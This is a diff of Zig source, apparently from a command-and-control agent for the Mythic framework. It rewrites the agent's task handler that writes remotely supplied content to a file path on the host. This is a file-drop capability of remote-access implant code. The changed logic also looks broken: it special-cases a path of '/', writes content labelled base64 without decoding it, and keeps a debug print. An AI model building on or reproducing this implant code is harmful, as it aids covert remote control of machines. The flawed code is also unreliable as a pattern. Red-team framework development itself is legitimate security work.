@@ -198,28 +198,33 @@ pub const CommandExecutor = struct {
         };
         defer parsed.deinit();
         
-        const filename = parsed.value.object.get("filename").?.string;
+        const remote_path = parsed.value.object.get("remote_path").?.string;
         const b64_content = parsed.value.object.get("content").?.string;
-        
-        const decoder = base64.standard.Decoder;
-        const decoded_size = try decoder.calcSizeForSlice(b64_content);
-        const decoded_content = try self.allocator.alloc(u8, decoded_size);
-        defer self.allocator.free(decoded_content);
-        
-        try decoder.decode(decoded_content, b64_content);
-        
-        std.fs.cwd().writeFile(.{ .sub_path = filename, .data = decoded_content }) catch |err| {
-            return MythicResponse{
-                .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
-                .completed = true,
-                .status = "error",
+
+        if (std.mem.eql(u8, remote_path, "/")) {
+            const file = try std.fs.createFileAbsolute(remote_path, .{});
+            defer file.close();
+            if (std.mem.startsWith(u8, b64_content, "b'") and std.mem.endsWith(u8, b64_content, "'")) {
+                // Remove the b'' prefix if present. Very hacky and hould be improved. Sould write an unescape function later.
+                const content = b64_content[2..b64_content.len - 1];
+                std.debug.print("content: {s}", .{content});
+                try file.writeAll(content);
+            } else {
+                try file.writeAll(b64_content);
+            }
+        } else {
+            std.fs.cwd().writeFile(.{ .sub_path = remote_path, .data = b64_content }) catch |err| {
+                return MythicResponse{
+                    .task_id = task.id,
+                    .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
+                    .completed = true,
+                    .status = "error",
+                };
             };
-        };
-        
+        }
         return MythicResponse{
             .task_id = task.id,
-            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ filename, decoded_content.len }),
+            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ remote_path, b64_content.len }),
             .completed = true,
             .status = "completed",
         };
